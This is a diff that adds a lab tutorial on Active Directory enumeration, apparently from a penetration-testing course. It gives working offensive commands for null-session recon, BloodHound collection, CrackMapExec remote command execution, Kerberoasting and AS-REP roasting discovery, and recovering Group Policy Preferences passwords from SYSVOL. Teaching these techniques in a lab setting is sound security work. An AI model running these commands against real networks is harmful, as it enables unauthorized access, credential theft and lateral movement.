@@ -1,0 +1,150 @@
+---
+title: "Tut01: Active Directory Enumeration"
+---
+
+Enumeration is the foundation of every AD engagement. Before you can exploit anything, you need to understand the structure of the domain: who the users are, which groups exist, what machines are joined, and what relationships connect them all.
+
+## Initial Unauthenticated Enumeration
+
+Some information leaks before you have any credentials.
+
+```sh
+# Enumerate domain with no credentials (null session)
+enum4linux-ng -A 192.168.1.10
+
+# Try anonymous LDAP bind
+ldapsearch -x -H ldap://192.168.1.10 -b "DC=corp,DC=local"
+
+# Check for open SMB shares
+smbclient -L //192.168.1.10 -N
+
+# RPC null session
+rpcclient -U "" -N 192.168.1.10
+rpcclient> enumdomusers
+rpcclient> enumdomgroups
+```
+
+## Enumeration with Valid Credentials
+
+With a low-privilege domain user account (even one with no special rights), you can query the entire directory.
+
+### Using BloodHound.py
+
+BloodHound.py collects AD data remotely from Linux:
+
+```sh
+# Collect all data types
+python3 bloodhound.py -u user -p 'Password123' -d corp.local -dc dc01.corp.local -c All
+
+# Upload the resulting JSON files to the BloodHound GUI
+```
+
+In the BloodHound GUI:
+
+- **Find Shortest Paths to Domain Admins** — the most useful built-in query.
+- **Find All Domain Admins** — identifies your targets.
+- **Find Principals with DCSync Rights** — critical privilege escalation paths.
+
+### CrackMapExec (CME)
+
+```sh
+# Enumerate SMB across a subnet
+crackmapexec smb 192.168.1.0/24 -u user -p 'Password123'
+
+# List logged-on users
+crackmapexec smb 192.168.1.10 -u user -p 'Password123' --loggedon-users
+
+# List shares
+crackmapexec smb 192.168.1.10 -u user -p 'Password123' --shares
+
+# Run a command
+crackmapexec smb 192.168.1.10 -u user -p 'Password123' -x "whoami"
+```
+
+### PowerView (on a Windows host)
+
+```powershell
+# Import module
+Import-Module .\PowerView.ps1
+
+# Get all domain users
+Get-DomainUser | Select-Object name,samaccountname,description
+
+# Get all groups
+Get-DomainGroup | Select-Object name
+
+# Find users in Domain Admins
+Get-DomainGroupMember "Domain Admins"
+
+# Find computers
+Get-DomainComputer | Select-Object name,operatingsystem,dnshostname
+
+# Find all admin shares
+Find-DomainShare -CheckShareAccess
+
+# Find users with local admin rights somewhere
+Find-LocalAdminAccess
+```
+
+## Key Objects to Enumerate
+
+### Users
+
+Look for:
+- Accounts with descriptions containing passwords (common admin mistake).
+- Accounts with `DONT_REQUIRE_PREAUTH` set (AS-REP Roasting).
+- Accounts with SPNs set (Kerberoasting).
+
+```sh
+# Find DONT_REQUIRE_PREAUTH users (Impacket)
+impacket-GetNPUsers corp.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.10
+
+# Find Kerberoastable accounts
+impacket-GetUserSPNs corp.local/user:Password123 -dc-ip 192.168.1.10
+```
+
+### Groups
+
+Privileged group membership defines the attack path. Enumerate:
+- `Domain Admins`
+- `Enterprise Admins`
+- `Account Operators` / `Backup Operators`
+- `DNSAdmins`
+- `Remote Management Users`
+- `Server Operators`
+
+### Group Policy Objects (GPOs)
+
+GPOs can contain passwords in scripts, drive maps, and scheduled tasks.
+
+```sh
+# Find GPP passwords in SYSVOL
+crackmapexec smb 192.168.1.10 -u user -p 'Password123' -M gpp_password
+
+# Manual: mount SYSVOL and search
+find /mnt/sysvol -name "*.xml" -exec grep -i "cpassword" {} +
+```
+
+Group Policy Preferences passwords are encrypted with a publicly known AES key—they are always recoverable.
+
+## Mapping Trust Relationships
+
+Domain trusts allow users from one domain to authenticate in another. They extend the attack surface significantly.
+
+```powershell
+# PowerView
+Get-DomainTrust
+
+# Net command
+nltest /domain_trusts
+```
+
+## Task
+
+> **[Task]** In your AD lab, log in as a low-privilege domain user. Run BloodHound.py to collect all data. In the BloodHound GUI, find the shortest path from your user to Domain Admins. Enumerate all users with SPNs and all users with DONT_REQUIRE_PREAUTH. Document everything you find.
+
+## Reference
+
+- [BloodHound Documentation](https://bloodhound.readthedocs.io)
+- [PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
+- [ired.team - AD Enumeration](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
